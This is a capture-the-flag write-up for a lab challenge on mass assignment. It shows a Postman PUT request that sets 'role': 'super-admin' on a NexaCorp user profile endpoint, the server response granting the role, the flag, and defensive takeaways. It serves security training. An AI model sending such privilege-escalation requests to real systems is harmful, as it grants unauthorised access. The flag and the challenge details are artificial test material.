# FLAG 3: Mass Assignment Privilege Escalation

[← Back to README](README.md) | [Previous: FLAG 2](FLAG-2-oauth-bypass.md) | [Next: FLAG 4 →](FLAG-4-ssrf.md)
---

## 🎯 Challenge Summary

| Aspect | Details |
|--------|---------|
| **Vulnerability Type** | Authorization Bypass - Mass Assignment |
| **Points** | 450 pts |
| **Prerequisite** | Need access_token from FLAG 2 |

---

## 📖 What is Mass Assignment?

Mass assignment is the coding equivalent of giving someone a profile update form and accidentally letting them tick "**Make me admin**."😬

### The NexaCorp Vulnerability Explained

### User Object Structure

```json
{
  "id": 1003,
  "email": "user@nexacorp.local",
  "displayName": "John Doe",
  "avatar": "https://api.dicebear.com/9.x/pixel-art/svg?seed=Felix",
  "role": "user",                // ← This should NOT be modifiable
  "permissions": ["read"],       // ← This should NOT be modifiable
  "createdAt": "2024-01-15"
}
```

### What We Can Exploit

The `role` field should ONLY be set by administrators, but:
- The endpoint accepts it from any user
- No validation on which fields can be modified
- Server directly assigns all request fields
- Results in privilege escalation

---

## 😈 Exploitation

### Created New Postman Request

```
Method: PUT
URL: http://nexacorp.ine.local:1337/api/v2/users/me
```

---

### Added Authorization Header

```
KEY                VALUE
─────────────────────────────────────────────
Authorization      Bearer [my access_token]
Content-Type       application/json
```
---

### Added Request Body with Privilege Escalation

```
{
  "displayName": "Attacker",
  "email": "attacker@nexacorp.local",
  "role": "super-admin"
}
```
- `role` - **SHOULD NOT BE CHANGEABLE** - This is the exploit!🌝

---
### Response

```json
{
  "success": true,
  "user": {
    "id": "1003",
    "email": "attacker@nexacorp.local",
    "displayName": "Attacker",
    "avatar": "https://api.dicebear.com/7.x/identicon/svg?seed=analyst",
    "role": "super-admin",
    "permissions": ["read"],
    "createdAt": "2024-01-15T10:00:00Z"
  },
  "message": "Profile updated. Privilege escalation detected — role written directly from request body.",
  "flag": "FLAG{m4ss_4ss1gn_pr1v_3sc4l4t10n}",
  "admin_panel": "/admin"
}
```
---

## 📋 Key Takeaways

1. Never use Object.assign() with user input
2. Always use allowlisting
3. Sensitive fields need server-side protection
4. This is a common vulnerability
---

[← Back to README](README.md) | [Previous: FLAG 2](FLAG-2-oauth-bypass.md) | [Next: FLAG 4 →](FLAG-4-ssrf.md)
